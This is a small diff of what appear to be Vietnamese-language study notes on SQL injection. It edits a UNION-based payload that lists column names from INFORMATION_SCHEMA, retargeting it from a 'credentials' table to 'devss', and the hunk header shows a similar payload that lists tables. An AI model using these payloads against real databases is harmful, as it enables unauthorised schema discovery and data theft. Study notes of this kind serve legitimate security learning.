@@ -29,7 +29,7 @@ cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES wher
 
 ## Columns 
 ```sql
-cn' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='devss'-- -
 ```
 
 - Columns **COLUMN_NAME* chứa all tên của columns hiện tại trên table 
